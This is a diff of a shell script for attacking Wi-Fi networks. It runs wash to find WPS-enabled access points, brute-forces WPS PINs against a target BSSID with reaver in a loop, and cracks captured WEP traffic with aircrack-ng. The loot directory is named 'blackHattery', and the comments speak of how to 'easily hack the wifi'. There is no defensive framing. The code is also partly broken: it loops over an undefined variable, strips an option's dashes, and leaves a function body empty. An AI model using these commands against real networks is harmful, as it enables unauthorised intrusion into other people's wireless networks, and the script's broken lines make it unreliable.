@@ -22,7 +22,7 @@ reav(){
     # find out if the WPS i enable or not for that we can use command:
     wash -i $INTERF -c $CHANNEL -C -s
     # if the WPS is not enabled then we can easily hack the wifi using reaver
-    reaver -i $INTERF -b $TARGETMAC –fail-wait=360
+    reaver -i $INTERF -b $TARGETMAC fail-wait=360
 }
 
 
@@ -65,3 +65,28 @@ otherOptions(){
     # once you have thousands of IVs ...
     aircrack-ng $WEPFILE.cap
 }
+
+
+#!/bin/bash
+## REAVR BRUTEFORCE
+
+LOOTDIR=/root/Dropbox/blackHattery/loot
+WORDLIST=tpglist.txt
+TARGETLIST=tpgtargets.txt
+
+INTERF=wlan0
+MONFACE=wlan1mon
+
+for WPSTRY in $TARGETIDa
+do
+    reaver -i $MONFACE -b $BSSID -p $WPSTRY -vv
+done
+
+reav(){
+    airmon-ng stop $INTERF
+    # find out if the WPS i enable or not for that we can use command:
+    wash -i $INTERF -c $CHANNEL -C -s
+    # if the WPS is not enabled then we can easily hack the wifi using reaver
+    
+}
+
